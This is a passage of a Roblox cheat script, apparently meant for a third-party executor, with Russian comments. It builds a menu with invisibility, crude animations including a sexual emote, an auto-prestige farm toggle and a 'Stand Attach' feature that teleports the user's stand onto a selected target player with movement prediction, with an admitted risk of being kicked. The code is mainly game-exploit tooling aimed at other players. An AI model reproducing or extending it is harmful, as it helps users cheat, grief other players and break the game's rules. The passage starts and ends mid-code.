FunHeader.Parent = FunLeft

createToggle(FunLeft, "Invisibility", false, function(enabled)
    if enabled then pcall(Invisibile) else pcall(Uninvisible) end
end)

local invisKeybindBtn = createButton(FunLeft, "Invis Key: L [Right Click]", function() end)

invisKeybindBtn.MouseButton2Click:Connect(function()
    waitingForInvisKey = true
    invisKeybindBtn.Text = "Press Any Key..."
    invisKeybindBtn.BackgroundColor3 = Color3.fromRGB(100, 80, 200)
    
    local connection
    connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.UserInputType == Enum.UserInputType.Keyboard then
            invisKeybind = input.KeyCode
            waitingForInvisKey = false
            invisKeybindBtn.Text = "Invis Key: " .. invisKeybind.Name .. " [Right Click]"
            TweenService:Create(invisKeybindBtn, TweenInfo.new(0.2), {
                BackgroundColor3 = Color3.fromRGB(22, 20, 30)
            }):Play()
            connection:Disconnect()
        end
    end)
end)


local DanceHeader = createSectionHeader("Animations")
DanceHeader.Parent = FunRight

createButton(FunRight, "🛑 Stop All Animations", function() stopAllAnimations() end)



-- Функция воспроизведения анимаций (НЕ ТРОГАЙ!)
local function playAnimation(data)
    if LocalPlayer.Character then
        local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            for k, conn in pairs(animPlayerConnections) do
                if conn and typeof(conn) == "RBXScriptConnection" then conn:Disconnect() end
            end
            animPlayerConnections = {}
            for k, t in pairs(animPlayerActive) do if t then pcall(function() t:Stop() end) end end
            animPlayerActive = {}
            
            if data.isJerk then
                local key = "jerk"
                local isR15 = humanoid.RigType == Enum.HumanoidRigType.R15
                local animation = Instance.new("Animation")
                animation.AnimationId = not isR15 and "rbxassetid://72042024" or "rbxassetid://698251653"
                local track = humanoid:LoadAnimation(animation)
                track.Looped = false
                local speed = isR15 and 0.7 or 0.65
                animPlayerActive[key] = track
                
                local conn = RunService.Heartbeat:Connect(function()
                    if not track or not animPlayerActive[key] then return end
                    
                    if not track.IsPlaying then
                        track:Play()
                        track:AdjustSpeed(speed)
                        track.TimePosition = 0.6
                    end
                    
                    local currentTime = track.TimePosition
                    if (not isR15 and currentTime >= 0.65) or (isR15 and currentTime >= 0.7) then
                        track:Stop()
                        task.wait(0.05)
                    end
                end)
                animPlayerConnections[key] = conn
            elseif data.name == "Twerk" then
                local key = "twerk"
                local animation = Instance.new("Animation")
                animation.AnimationId = "rbxassetid://12874447851"
                local animTrack = humanoid:LoadAnimation(animation)
                animTrack.Looped = true
                local speed = data.speed or 1.5
                animTrack:Play(0, 1, speed)
                animTrack.TimePosition = data.timepos or 3.9
                animPlayerActive[key] = animTrack
                
                local startTime, endTime = 3.90, 5.10
                local isReverse, isPlaying = false, false
                local conn = RunService.Heartbeat:Connect(function()
                    if not animTrack or not animTrack.IsPlaying and not animTrack.Looped then return end
                    if not isPlaying then
                        isPlaying = true
                        if not isReverse then
                            animTrack:Play(0, 1, speed)
                            animTrack.TimePosition = startTime
                        else
                            animTrack:Play(0, 1, -speed)
                            animTrack.TimePosition = endTime
                        end
                    end
                    local currentTime = animTrack.TimePosition
                    if not isReverse and currentTime >= endTime then
                        isReverse, isPlaying = true, false
                    elseif isReverse and currentTime <= startTime then
                        isReverse, isPlaying = false, false
                    end
                end)
                animPlayerConnections[key] = conn
            else
                local animation = Instance.new("Animation")
                animation.AnimationId = "rbxassetid://" .. tostring(data.id)
                local track = humanoid:LoadAnimation(animation)
                track:Play()
                track.Looped = data.looped
                track.TimePosition = data.timepos or 0
                if data.speed and type(data.speed) == "number" and data.speed > 0 then
                    pcall(function() track:AdjustSpeed(data.speed) end)
                end
                pcall(function() track:AdjustWeight(999) end)
                local key = tostring(data.id)
                animPlayerActive[key] = track
                if data.freezeonend then
                    local connection
                    connection = track.Stopped:Connect(function()
                        if humanoid and humanoid.Parent then
                            humanoid.AutoRotate = false
                            humanoid.WalkSpeed = 0
                            humanoid.JumpPower = 0
                        end
                        if connection then connection:Disconnect() end
                    end)
                end
            end
        end
    end
end

-- ========================================
-- УЛУЧШЕННЫЙ DROPDOWN ДЛЯ АНИМАЦИЙ
-- ========================================

-- Панель выбора анимации (как у выбора игроков)
local AnimSelPanel = Instance.new("Frame")
AnimSelPanel.Size = UDim2.new(1, 0, 0, 40)
AnimSelPanel.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
AnimSelPanel.Parent = FunRight

local AnimSelCorner = Instance.new("UICorner")
AnimSelCorner.CornerRadius = UDim.new(0, 20)
AnimSelCorner.Parent = AnimSelPanel

local AnimLabel = Instance.new("TextLabel")
AnimLabel.Size = UDim2.new(0.6, 0, 1, 0)
AnimLabel.Position = UDim2.new(0, 8, 0, 0)
AnimLabel.BackgroundTransparency = 1
AnimLabel.Text = "Animation: None"
AnimLabel.Font = Enum.Font.Gotham
AnimLabel.TextSize = 11
AnimLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
AnimLabel.TextXAlignment = Enum.TextXAlignment.Left
AnimLabel.Parent = AnimSelPanel

local AnimSelectBtn = Instance.new("TextButton")
AnimSelectBtn.Size = UDim2.new(0, 80, 0, 28)
AnimSelectBtn.Position = UDim2.new(1, -86, 0.5, -14)
AnimSelectBtn.BackgroundColor3 = Color3.fromRGB(100, 80, 200)
AnimSelectBtn.Text = "Select"
AnimSelectBtn.Font = Enum.Font.Gotham
AnimSelectBtn.TextSize = 11
AnimSelectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
AnimSelectBtn.BorderSizePixel = 0
AnimSelectBtn.Parent = AnimSelPanel

local AnimSelectBtnCorner = Instance.new("UICorner")
AnimSelectBtnCorner.CornerRadius = UDim.new(0, 20)
AnimSelectBtnCorner.Parent = AnimSelectBtn

-- Dropdown контейнер
local AnimDropdown = Instance.new("Frame")
AnimDropdown.Size = UDim2.new(1, 0, 0, 450)
AnimDropdown.Position = UDim2.new(0, 0, 1, 5)
AnimDropdown.BackgroundColor3 = Color3.fromRGB(26, 24, 34)
AnimDropdown.BorderSizePixel = 0
AnimDropdown.Visible = false
AnimDropdown.ZIndex = 100
AnimDropdown.Parent = FunRight

local AnimDropCorner = Instance.new("UICorner")
AnimDropCorner.CornerRadius = UDim.new(0, 20)
AnimDropCorner.Parent = AnimDropdown

-- Поле поиска
local AnimSearchFrame = Instance.new("Frame")
AnimSearchFrame.Size = UDim2.new(1, -16, 0, 32)
AnimSearchFrame.Position = UDim2.new(0, 8, 0, 8)
AnimSearchFrame.BackgroundColor3 = Color3.fromRGB(24, 22, 32)
AnimSearchFrame.BorderSizePixel = 0
AnimSearchFrame.ZIndex = 101
AnimSearchFrame.Parent = AnimDropdown

local AnimSearchCorner = Instance.new("UICorner")
AnimSearchCorner.CornerRadius = UDim.new(0, 16)
AnimSearchCorner.Parent = AnimSearchFrame

local AnimSearchBox = Instance.new("TextBox")
AnimSearchBox.Size = UDim2.new(1, -20, 1, 0)
AnimSearchBox.Position = UDim2.new(0, 10, 0, 0)
AnimSearchBox.BackgroundTransparency = 1
AnimSearchBox.Text = ""
AnimSearchBox.PlaceholderText = "🔍 Search animations..."
AnimSearchBox.Font = Enum.Font.Gotham
AnimSearchBox.TextSize = 11
AnimSearchBox.TextColor3 = Color3.fromRGB(200, 200, 200)
AnimSearchBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
AnimSearchBox.TextXAlignment = Enum.TextXAlignment.Left
AnimSearchBox.ClearTextOnFocus = false
AnimSearchBox.ZIndex = 102
AnimSearchBox.Parent = AnimSearchFrame

-- Счётчик анимаций
local AnimCount = Instance.new("TextLabel")
AnimCount.Size = UDim2.new(1, -16, 0, 20)
AnimCount.Position = UDim2.new(0, 8, 0, 45)
AnimCount.BackgroundTransparency = 1
AnimCount.Text = "Animations: 0"
AnimCount.Font = Enum.Font.GothamBold
AnimCount.TextSize = 10
AnimCount.TextColor3 = Color3.fromRGB(100, 80, 200)
AnimCount.TextXAlignment = Enum.TextXAlignment.Left
AnimCount.ZIndex = 101
AnimCount.Parent = AnimDropdown

-- ScrollingFrame для списка анимаций
local AnimScroll = Instance.new("ScrollingFrame")
AnimScroll.Size = UDim2.new(1, -16, 1, -78)
AnimScroll.Position = UDim2.new(0, 8, 0, 70)
AnimScroll.BackgroundTransparency = 1
AnimScroll.ScrollBarThickness = 6
AnimScroll.ScrollBarImageColor3 = Color3.fromRGB(100, 80, 200)
AnimScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
AnimScroll.ScrollingDirection = Enum.ScrollingDirection.Y
AnimScroll.ZIndex = 102
AnimScroll.Parent = AnimDropdown

local AnimLayout = Instance.new("UIListLayout")
AnimLayout.Padding = UDim.new(0, 4)
AnimLayout.Parent = AnimScroll

AnimLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    AnimScroll.CanvasSize = UDim2.new(0, 0, 0, AnimLayout.AbsoluteContentSize.Y + 20)
end)

local animButtons = {}
local animDropdownOpen = false

-- Функция обновления списка анимаций
local function updateAnimationList()
    for _, btn in pairs(animButtons) do
        if btn and btn.Parent then
            btn:Destroy()
        end
    end
    animButtons = {}
    
    local searchText = AnimSearchBox.Text:lower()
    local count = 0
    
    for _, anim in ipairs(animations) do
        local animName = anim.name:lower()
        
        if searchText == "" or animName:find(searchText, 1, true) then
            count = count + 1
            
            -- Выбор эмодзи
            local emoji = "🎵"
            if anim.name == "Twerk" then emoji = "💃"
            elseif anim.name == "Dog" then emoji = "🐕"
            elseif anim.name == "Plane" then emoji = "✈️"
            elseif anim.name == "Float" then emoji = "🧘"
            elseif anim.name == "Snake" then emoji = "🐍"
            elseif anim.name:find("Sit") then emoji = "🪑"
            elseif anim.name:find("Death") then emoji = "💀"
            elseif anim.name:find("Basketball") then emoji = "🏀"
            elseif anim.name == "Car" or anim.name == "Tank" then emoji = "🚗"
            elseif anim.name == "Ragdoll" then emoji = "🤕"
            elseif anim.name:find("Helicopter") then emoji = "🚁"
            elseif anim.name == "Silver Surfer" then emoji = "🏄"
            elseif anim.name == "Skibidi Toilet" then emoji = "🚽"
            elseif anim.name == "Jerk Off" then emoji = "🍆"
            end
            
            local AnimBtn = Instance.new("TextButton")
            AnimBtn.Size = UDim2.new(1, -8, 0, 32)
            AnimBtn.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
            AnimBtn.Text = ""
            AnimBtn.BorderSizePixel = 0
            AnimBtn.ZIndex = 102
            AnimBtn.Parent = AnimScroll
            
            local ABCorner = Instance.new("UICorner")
            ABCorner.CornerRadius = UDim.new(0, 16)
            ABCorner.Parent = AnimBtn
            
            -- Эмодзи иконка
            local AnimIcon = Instance.new("TextLabel")
            AnimIcon.Size = UDim2.new(0, 24, 1, 0)
            AnimIcon.Position = UDim2.new(0, 8, 0, 0)
            AnimIcon.BackgroundTransparency = 1
            AnimIcon.Text = emoji
            AnimIcon.Font = Enum.Font.GothamBold
            AnimIcon.TextSize = 14
            AnimIcon.ZIndex = 103
            AnimIcon.Parent = AnimBtn
            
            -- Название анимации
            local AnimNameLabel = Instance.new("TextLabel")
            AnimNameLabel.Size = UDim2.new(1, -40, 1, 0)
            AnimNameLabel.Position = UDim2.new(0, 36, 0, 0)
            AnimNameLabel.BackgroundTransparency = 1
            AnimNameLabel.Text = anim.name
            AnimNameLabel.Font = Enum.Font.GothamBold
            AnimNameLabel.TextSize = 11
            AnimNameLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
            AnimNameLabel.TextXAlignment = Enum.TextXAlignment.Left
            AnimNameLabel.TextTruncate = Enum.TextTruncate.AtEnd
            AnimNameLabel.ZIndex = 103
            AnimNameLabel.Parent = AnimBtn
            
            -- Hover эффект
            AnimBtn.MouseEnter:Connect(function()
                TweenService:Create(AnimBtn, TweenInfo.new(0.15), {
                    BackgroundColor3 = Color3.fromRGB(100, 80, 200)
                }):Play()
            end)
            
            AnimBtn.MouseLeave:Connect(function()
                TweenService:Create(AnimBtn, TweenInfo.new(0.15), {
                    BackgroundColor3 = Color3.fromRGB(36, 36, 36)
                }):Play()
            end)
            
            -- Клик по анимации
            AnimBtn.MouseButton1Click:Connect(function()
                playAnimation(anim)
                AnimLabel.Text = "Animation: " .. anim.name
                AnimLabel.TextColor3 = Color3.fromRGB(100, 255, 140)
                animDropdownOpen = false
                AnimDropdown.Visible = false
                
                TweenService:Create(AnimBtn, TweenInfo.new(0.1), {
                    BackgroundColor3 = Color3.fromRGB(100, 255, 140)
                }):Play()
                task.wait(0.2)
                TweenService:Create(AnimBtn, TweenInfo.new(0.2), {
                    BackgroundColor3 = Color3.fromRGB(36, 36, 36)
                }):Play()
            end)
            
            table.insert(animButtons, AnimBtn)
        end
    end
    
    AnimCount.Text = string.format("Animations: %d / %d", count, #animations)
    task.wait(0.1)
    AnimScroll.CanvasSize = UDim2.new(0, 0, 0, AnimLayout.AbsoluteContentSize.Y + 50)
end

-- Поиск в реальном времени
AnimSearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    updateAnimationList()
end)

-- Открытие/закрытие dropdown
AnimSelectBtn.MouseButton1Click:Connect(function()
    animDropdownOpen = not animDropdownOpen
    AnimDropdown.Visible = animDropdownOpen
    
    if animDropdownOpen then
        updateAnimationList()
        AnimSearchBox.Text = ""
        AnimSearchBox:CaptureFocus()
    end
end)

-- Закрытие при клике вне dropdown
UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and animDropdownOpen then
        local mousePos = UserInputService:GetMouseLocation()
        local dropPos = AnimDropdown.AbsolutePosition
        local dropSize = AnimDropdown.AbsoluteSize
        local btnPos = AnimSelectBtn.AbsolutePosition
        local btnSize = AnimSelectBtn.AbsoluteSize
        
        local insideDrop = mousePos.X >= dropPos.X and mousePos.X <= dropPos.X + dropSize.X and 
                          mousePos.Y >= dropPos.Y and mousePos.Y <= dropPos.Y + dropSize.Y
        local insideBtn = mousePos.X >= btnPos.X and mousePos.X <= btnPos.X + btnSize.X and 
                         mousePos.Y >= btnPos.Y and mousePos.Y <= btnPos.Y + btnSize.Y
        
        if not insideDrop and not insideBtn then
            animDropdownOpen = false
            AnimDropdown.Visible = false
        end
    end
end)

end

-- ========================================
-- FARM PAGE (НОВОЕ - ДОБАВЛЕНО)
-- ========================================
local FarmPage, FarmLeft, FarmRight
do
FarmPage, FarmLeft, FarmRight = createPage()

local FarmHeader = createSectionHeader("Auto Prestige Control")
FarmHeader.Parent = FarmLeft

-- Большая кнопка ON/OFF
local FarmToggleFrame = Instance.new("Frame")
FarmToggleFrame.Size = UDim2.new(1, 0, 0, 80)
FarmToggleFrame.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
FarmToggleFrame.BorderSizePixel = 0
FarmToggleFrame.Parent = FarmLeft

local FarmToggleCorner = Instance.new("UICorner")
FarmToggleCorner.CornerRadius = UDim.new(0, 16)
FarmToggleCorner.Parent = FarmToggleFrame

local FarmStatusLabel = Instance.new("TextLabel")
FarmStatusLabel.Size = UDim2.new(1, -20, 0, 20)
FarmStatusLabel.Position = UDim2.new(0, 10, 0, 10)
FarmStatusLabel.BackgroundTransparency = 1
FarmStatusLabel.Text = "Status: DISABLED"
FarmStatusLabel.Font = Enum.Font.GothamBold
FarmStatusLabel.TextSize = 13
FarmStatusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
FarmStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
FarmStatusLabel.Parent = FarmToggleFrame

local FarmToggleButton = Instance.new("TextButton")
FarmToggleButton.Size = UDim2.new(1, -20, 0, 38)
FarmToggleButton.Position = UDim2.new(0, 10, 0, 35)
FarmToggleButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
FarmToggleButton.Text = "🔴  OFF"
FarmToggleButton.Font = Enum.Font.GothamBold
FarmToggleButton.TextSize = 16
FarmToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FarmToggleButton.BorderSizePixel = 0
FarmToggleButton.Parent = FarmToggleFrame

local FarmButtonCorner = Instance.new("UICorner")
FarmButtonCorner.CornerRadius = UDim.new(0, 12)
FarmButtonCorner.Parent = FarmToggleButton

FarmToggleButton.MouseButton1Click:Connect(function()
    getgenv().scriptEnabled = not getgenv().scriptEnabled
    
    if getgenv().scriptEnabled then
        FarmToggleButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
        FarmToggleButton.Text = "🟢  ON"
        FarmStatusLabel.Text = "Restarting Script..."
        FarmStatusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
        task.wait(0.3)
        FarmStatusLabel.Text = "SecretClub Active"
        FarmStatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
        -- ПОЛНЫЙ ПЕРЕЗАПУСК СКРИПТА
        RunScript()
    else
        FarmToggleButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
        FarmToggleButton.Text = "🔴  OFF"
        FarmStatusLabel.Text = "Script Stopped"
        FarmStatusLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
    end
end)

FarmToggleButton.MouseEnter:Connect(function()
    local hoverColor = getgenv().AutoFarmEnabled and Color3.fromRGB(60, 215, 60) or Color3.fromRGB(230, 30, 70)
    TweenService:Create(FarmToggleButton, TweenInfo.new(0.1), {BackgroundColor3 = hoverColor}):Play()
end)

FarmToggleButton.MouseLeave:Connect(function()
    local normalColor = getgenv().AutoFarmEnabled and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
    TweenService:Create(FarmToggleButton, TweenInfo.new(0.1), {BackgroundColor3 = normalColor}):Play()
end)

-- Информация
local FarmInfoHeader = createSectionHeader("Information")
FarmInfoHeader.Parent = FarmRight

local FarmInfoLabel = Instance.new("TextLabel")
FarmInfoLabel.Size = UDim2.new(1, 0, 0, 120)
FarmInfoLabel.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
FarmInfoLabel.BorderSizePixel = 0
FarmInfoLabel.Text = "  The Auto Prestige feature allows\n  automated gameplay.\n  • Does not work with xeno"
FarmInfoLabel.Font = Enum.Font.Gotham
FarmInfoLabel.TextSize = 11
FarmInfoLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
FarmInfoLabel.TextXAlignment = Enum.TextXAlignment.Left
FarmInfoLabel.TextYAlignment = Enum.TextYAlignment.Top
FarmInfoLabel.Parent = FarmRight

local FarmInfoCorner = Instance.new("UICorner")
FarmInfoCorner.CornerRadius = UDim.new(0, 16)
FarmInfoCorner.Parent = FarmInfoLabel
end

-- ========================================
-- STAND ATTACH PAGE
-- ========================================
local AttachPage, AttachLeft, AttachRight
do
AttachPage, AttachLeft, AttachRight = createPage()

local AttachHeader = createSectionHeader("Stand Attach")
AttachHeader.Parent = AttachLeft


local standAttachActive = false
local standAttachDistance = 2.5
local predictionStrength = 0.5
local followStandActive = false
local viewStandActive = false
local standAttachConnection = nil


createToggle(AttachLeft, "Stand Attach", false, function(enabled)
    standAttachActive = enabled
    
    if enabled then
        -- Проверка: выбран ли игрок
        if not AttachSettings.target then
            print("❌ Please select a player first!")
            return
        end
        
        -- Проверка: есть ли стенд
        local char = LocalPlayer.Character
        if not char or not char:FindFirstChild("StandMorph") then
            print("❌ You need to summon your stand first (Press Q)!")
            return
        end
        
        
        standAttachConnection = RunService.RenderStepped:Connect(function()
            local Char = LocalPlayer.Character
            local EnemyChar = workspace.Living:FindFirstChild(AttachSettings.target)
            
            if Char and EnemyChar and EnemyChar:FindFirstChild("HumanoidRootPart") then
                local Stand = Char:FindFirstChild("StandMorph")
                
                if Stand and Stand:FindFirstChild("HumanoidRootPart") then
                    -- ⚡ MAX FORCE ДЛЯ МГНОВЕННОГО ПОЗИЦИОНИРОВАНИЯ
                    local standAttach = Stand.HumanoidRootPart:FindFirstChild("StandAttach")
                    if standAttach and standAttach:FindFirstChild("AlignPosition") then
                        standAttach.AlignPosition.MaxForce = 9e9
                    end
                    
                    -- 🎯 РАСЧЁТ ПРЕДСКАЗАНИЯ ДВИЖЕНИЯ
                    local Prediction = EnemyChar.HumanoidRootPart.Velocity * predictionStrength
                    
                    if Prediction.Magnitude == 0 then
                        -- Цель стоит на месте
                        Stand.HumanoidRootPart.CFrame = EnemyChar.HumanoidRootPart.CFrame + 
                            EnemyChar.HumanoidRootPart.CFrame.LookVector * standAttachDistance
                        Stand.HumanoidRootPart.CFrame = CFrame.lookAt(
                            Stand.HumanoidRootPart.Position, 
                            EnemyChar.HumanoidRootPart.Position
                        )
                    else
                        -- Цель движется - используем предсказание
                        Stand.HumanoidRootPart.CFrame = EnemyChar.HumanoidRootPart.CFrame + Prediction
                        Stand.HumanoidRootPart.CFrame = CFrame.lookAt(
                            Stand.HumanoidRootPart.Position, 
                            EnemyChar.HumanoidRootPart.Position
                        )
                    end
                    
                    -- 🏃 FOLLOW STAND - телепортирует тело игрока под стендом
                    if followStandActive and Char.PrimaryPart then
                        Char.PrimaryPart.CFrame = Stand.HumanoidRootPart.CFrame - Vector3.new(0, 25, 0)
                    end
                    
                    -- 👁️ VIEW STAND - камера фокусируется на цели
                    if viewStandActive then
                        if not Char:FindFirstChild("FocusCam") then
                            local FocusCam = Instance.new("ObjectValue", Char)
                            FocusCam.Name = "FocusCam"
                            FocusCam.Value = EnemyChar.HumanoidRootPart
                        else
                            Char.FocusCam.Value = EnemyChar.HumanoidRootPart
                        end
                    else
                        local FocusCam = Char:FindFirstChild("FocusCam")
                        if FocusCam then
                            FocusCam:Destroy()
                        end
                    end
                end
            end
        end)
        
        print("✅ Stand Attach ENABLED - Your stand will follow the target")
    else
        -- ❌ ВЫКЛЮЧЕНИЕ STAND ATTACH
        if standAttachConnection then
            standAttachConnection:Disconnect()
            standAttachConnection = nil
        end
        
        local Char = LocalPlayer.Character
        if Char then
            -- Удаляем FocusCam
            local FocusCam = Char:FindFirstChild("FocusCam")
            if FocusCam then
                FocusCam:Destroy()
            end
            
            -- Поднимаем тело если был Follow Stand
            if followStandActive and Char.PrimaryPart then
                Char.PrimaryPart.CFrame = Char.PrimaryPart.CFrame + Vector3.new(0, 25, 0)
            end
        end
        
        print("❌ Stand Attach DISABLED")
    end
end)

-- ========================================
-- STAND ATTACH DISTANCE SLIDER (0 - 3.5)
-- ========================================
createSlider(AttachLeft, "Stand Distance", 0, 3.5, 2.5, function(value) 
    standAttachDistance = value
    print("Stand Distance:", value)
end)

-- ========================================
-- PREDICTION STRENGTH SLIDER (0 - 0.5)
-- ========================================
createSlider(AttachLeft, "Prediction", 0, 0.5, 0.5, function(value) 
    predictionStrength = value
    print("Prediction Strength:", value)
end)

-- ========================================
-- FOLLOW STAND TOGGLE
-- ========================================
createToggle(AttachLeft, "Follow Stand(Maybe kick)", false, function(enabled)
    followStandActive = enabled
    
    if enabled then
        print("✅ Follow Stand ENABLED - Your body will teleport under stand")
    else
        print("❌ Follow Stand DISABLED")
        
        -- Поднимаем тело обратно если Stand Attach активен
        if standAttachActive then
            local char = LocalPlayer.Character
            if char and char.PrimaryPart then
                char.PrimaryPart.CFrame = char.PrimaryPart.CFrame + Vector3.new(0, 25, 0)
            end
        end
    end
end)

-- ========================================
-- VIEW STAND TOGGLE
-- ========================================
createToggle(AttachLeft, "View Stand", false, function(enabled)
    viewStandActive = enabled
    
    if enabled then
        print("✅ View Stand ENABLED - Camera will focus on target")
    else
        print("❌ View Stand DISABLED")
    end
end)

-- ========================================
-- КРАСИВОЕ МЕНЮ ВЫБОРА ИГРОКА (БЕЗ ИЗМЕНЕНИЙ)
-- ========================================
local QuickSelectHeader = createSectionHeader("Target Player")
QuickSelectHeader.Parent = AttachRight

-- ========================================
-- ПАНЕЛЬ ВЫБОРА ИГРОКА (УЛУЧШЕННЫЙ DROPDOWN)
-- ========================================
local PlayerSelPanel = Instance.new("Frame")
PlayerSelPanel.Size = UDim2.new(1, 0, 0, 40)
PlayerSelPanel.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
PlayerSelPanel.Parent = AttachRight

local PlayerSelCorner = Instance.new("UICorner")
PlayerSelCorner.CornerRadius = UDim.new(0, 20)
PlayerSelCorner.Parent = PlayerSelPanel

local PlayerLabel = Instance.new("TextLabel")
PlayerLabel.Size = UDim2.new(0.6, 0, 1, 0)
PlayerLabel.Position = UDim2.new(0, 8, 0, 0)
PlayerLabel.BackgroundTransparency = 1
PlayerLabel.Text = "Target: None"
PlayerLabel.Font = Enum.Font.Gotham
PlayerLabel.TextSize = 11
PlayerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
PlayerLabel.TextXAlignment = Enum.TextXAlignment.Left
PlayerLabel.Parent = PlayerSelPanel

local SelectBtn = Instance.new("TextButton")
SelectBtn.Size = UDim2.new(0, 80, 0, 28)
SelectBtn.Position = UDim2.new(1, -86, 0.5, -14)
SelectBtn.BackgroundColor3 = Color3.fromRGB(100, 80, 200)
SelectBtn.Text = "Select"
SelectBtn.Font = Enum.Font.Gotham
SelectBtn.TextSize = 11
SelectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SelectBtn.BorderSizePixel = 0
SelectBtn.Parent = PlayerSelPanel

local SelectBtnCorner = Instance.new("UICorner")
SelectBtnCorner.CornerRadius = UDim.new(0, 20)
SelectBtnCorner.Parent = SelectBtn

-- ========================================
-- DROPDOWN С ПОИСКОМ
-- ========================================
local PlayerDropdown = Instance.new("Frame")
PlayerDropdown.Size = UDim2.new(1, 0, 0, 450)
PlayerDropdown.Position = UDim2.new(0, 0, 1, 5)
PlayerDropdown.BackgroundColor3 = Color3.fromRGB(26, 24, 34)
PlayerDropdown.BorderSizePixel = 0
PlayerDropdown.Visible = false
PlayerDropdown.ZIndex = 100
PlayerDropdown.Parent = AttachRight

local DropdownCorner = Instance.new("UICorner")
DropdownCorner.CornerRadius = UDim.new(0, 20)
DropdownCorner.Parent = PlayerDropdown

-- Поле поиска
local SearchFrame = Instance.new("Frame")
SearchFrame.Size = UDim2.new(1, -16, 0, 32)
SearchFrame.Position = UDim2.new(0, 8, 0, 8)
SearchFrame.BackgroundColor3 = Color3.fromRGB(24, 22, 32)
SearchFrame.BorderSizePixel = 0
SearchFrame.ZIndex = 101
SearchFrame.Parent = PlayerDropdown

local SearchCorner = Instance.new("UICorner")
SearchCorner.CornerRadius = UDim.new(0, 16)
SearchCorner.Parent = SearchFrame

local SearchBox = Instance.new("TextBox")
SearchBox.Size = UDim2.new(1, -20, 1, 0)
SearchBox.Position = UDim2.new(0, 10, 0, 0)
SearchBox.BackgroundTransparency = 1
SearchBox.Text = ""
SearchBox.PlaceholderText = "🔍 Search player..."
SearchBox.Font = Enum.Font.Gotham
SearchBox.TextSize = 11
SearchBox.TextColor3 = Color3.fromRGB(200, 200, 200)
SearchBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
SearchBox.TextXAlignment = Enum.TextXAlignment.Left
SearchBox.ClearTextOnFocus = false
SearchBox.ZIndex = 102
SearchBox.Parent = SearchFrame

-- Счётчик игроков
local PlayerCount = Instance.new("TextLabel")
PlayerCount.Size = UDim2.new(1, -16, 0, 20)
PlayerCount.Position = UDim2.new(0, 8, 0, 45)
PlayerCount.BackgroundTransparency = 1
PlayerCount.Text = "Players: 0"
PlayerCount.Font = Enum.Font.GothamBold
PlayerCount.TextSize = 10
PlayerCount.TextColor3 = Color3.fromRGB(100, 80, 200)
PlayerCount.TextXAlignment = Enum.TextXAlignment.Left
PlayerCount.ZIndex = 101
PlayerCount.Parent = PlayerDropdown

-- ScrollingFrame для списка игроков
local PlayerScroll = Instance.new("ScrollingFrame")
PlayerScroll.Size = UDim2.new(1, -16, 1, -78)
PlayerScroll.Position = UDim2.new(0, 8, 0, 70)
PlayerScroll.BackgroundTransparency = 1
PlayerScroll.ScrollBarThickness = 6
PlayerScroll.ScrollBarImageColor3 = Color3.fromRGB(100, 80, 200)
PlayerScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
PlayerScroll.ScrollingDirection = Enum.ScrollingDirection.Y
PlayerScroll.ZIndex = 102
PlayerScroll.Parent = PlayerDropdown

local PlayerLayout = Instance.new("UIListLayout")
PlayerLayout.Padding = UDim.new(0, 4)
PlayerLayout.Parent = PlayerScroll

PlayerLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    PlayerScroll.CanvasSize = UDim2.new(0, 0, 0, PlayerLayout.AbsoluteContentSize.Y + 20)
end)

local playerButtons = {}
local dropdownOpen = false

-- Функция обновления списка игроков
local function updatePlayerList()
    for _, btn in pairs(playerButtons) do
        if btn and btn.Parent then
            btn:Destroy()
        end
    end
    playerButtons = {}
    
    local searchText = SearchBox.Text:lower()
    local count = 0
    
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local displayName = plr.DisplayName:lower()
            local username = plr.Name:lower()
            
            if searchText == "" or displayName:find(searchText, 1, true) or username:find(searchText, 1, true) then
                count = count + 1
                
                local PlayerBtn = Instance.new("TextButton")
                PlayerBtn.Size = UDim2.new(1, -8, 0, 32)
                PlayerBtn.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
                PlayerBtn.Text = ""
                PlayerBtn.BorderSizePixel = 0
                PlayerBtn.ZIndex = 102
                PlayerBtn.Parent = PlayerScroll
                
                local PBCorner = Instance.new("UICorner")
                PBCorner.CornerRadius = UDim.new(0, 16)
                PBCorner.Parent = PlayerBtn
                
                -- Иконка игрока
                local PlayerIcon = Instance.new("TextLabel")
                PlayerIcon.Size = UDim2.new(0, 24, 1, 0)
                PlayerIcon.Position = UDim2.new(0, 8, 0, 0)
                PlayerIcon.BackgroundTransparency = 1
                PlayerIcon.Text = "👤"
                PlayerIcon.Font = Enum.Font.GothamBold
                PlayerIcon.TextSize = 14
                PlayerIcon.TextColor3 = Color3.fromRGB(100, 80, 200)
                PlayerIcon.ZIndex = 103
                PlayerIcon.Parent = PlayerBtn
                
                -- Имя игрока
                local PlayerNameLabel = Instance.new("TextLabel")
